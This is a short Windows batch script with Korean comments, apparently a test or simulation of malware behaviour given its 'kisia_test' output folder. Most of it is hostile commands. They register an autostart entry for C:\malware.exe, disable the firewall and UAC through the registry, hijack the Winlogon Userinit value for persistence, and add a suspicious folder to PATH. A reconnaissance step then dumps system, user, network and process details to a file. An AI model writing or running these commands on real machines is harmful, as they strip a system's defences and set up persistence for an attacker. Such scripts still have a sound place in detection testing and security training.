@echo off
chcp 65001 > nul   REM UTF-8 인코딩(한글 깨짐 방지)

REM 결과 파일 경로 지정
set RESULT_FILE=D:\kisia_test\project\bat_result.txt


rem 1. 자동 실행 등록
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "EvilApp" /d "C:\malware.exe" /f

rem 2. 방화벽 해제
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile" /v "EnableFirewall" /t REG_DWORD /d 0 /f

rem 3. UAC 해제
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableLUA" /t REG_DWORD /d 0 /f

rem 4. Userinit 값 수정
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit" /d "C:\Windows\system32\userinit.exe,C:\malware.exe" /f

rem 5. 환경 변수 PATH에 경로 추가
setx Path "%Path%;C:\maldir"


REM 명령 1: systeminfo
echo --- systeminfo --- > "%RESULT_FILE%"
systeminfo >> "%RESULT_FILE%"

REM 명령 2: whoami
echo. >> "%RESULT_FILE%"
echo --- whoami --- >> "%RESULT_FILE%"
whoami >> "%RESULT_FILE%"

REM 명령 3: netstat
echo. >> "%RESULT_FILE%"
echo --- netstat --- >> "%RESULT_FILE%"
netstat -ano >> "%RESULT_FILE%"

REM 명령 4: ipconfig
echo. >> "%RESULT_FILE%"
echo --- ipconfig --- >> "%RESULT_FILE%"
ipconfig /all >> "%RESULT_FILE%"

REM 명령 5: tasklist
echo. >> "%RESULT_FILE%"
echo --- tasklist --- >> "%RESULT_FILE%"
tasklist >> "%RESULT_FILE%"

echo [INFO] 결과가 "%RESULT_FILE%"에 저장되었습니다.
pause
